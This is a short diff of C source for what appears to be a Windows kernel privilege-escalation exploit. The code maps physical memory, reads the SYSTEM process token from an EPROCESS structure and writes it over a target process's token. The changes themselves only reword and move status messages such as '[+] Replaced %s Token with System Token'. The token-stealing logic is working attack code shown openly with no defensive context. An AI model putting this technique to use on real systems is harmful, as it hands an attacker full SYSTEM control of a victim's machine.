@@ -102,7 +102,7 @@ int main(int argc, char** argv)
 		PVOID castedBuf = *buf;
 		castedBuf = (unsigned char*)castedBuf + (EPROCESS_SYSTEM[i] & (unsigned __int64)-1 & 0xFFF);
 		castedBuf = (unsigned char*)castedBuf + _EPROCESS_Token_offset;
-		printf("This should be the token: %p\n", (void*)*(unsigned __int64*)castedBuf);
+		printf("[+]System Token found: %p\n", (void*)*(unsigned __int64*)castedBuf);
 		systemToken = *(unsigned __int64*)castedBuf;
 		if (UnmapPhysicalMemory(buf) == FALSE) {
 			printf("UnmapPhysicalMemory failed\n");
@@ -131,15 +131,14 @@ int main(int argc, char** argv)
 		PVOID castedBuf = *buf;
 		castedBuf = (unsigned char*)castedBuf + (EPROCESS_cmd[i] & (unsigned __int64)-1 & 0xFFF);
 		castedBuf = (unsigned char*)castedBuf + _EPROCESS_Token_offset;
-		printf("This should be the token: %p\n", (void*)*(unsigned __int64*)castedBuf);
 		*(unsigned __int64*)castedBuf = systemToken; // this should do it
-		printf("[+] Replaced %s Token with System Token\n", targetProcess);
-
+		
 		if (UnmapPhysicalMemory(buf) == FALSE) {
 			printf("UnmapPhysicalMemory failed\n");
 			return -1;
 		}
 	}
+	printf("[+] Replaced %s Token with System Token\n", targetProcess);
 	
 	free(buf);
 	CloseHandle((HANDLE)*(PDWORD64)hPhysicalMemory);
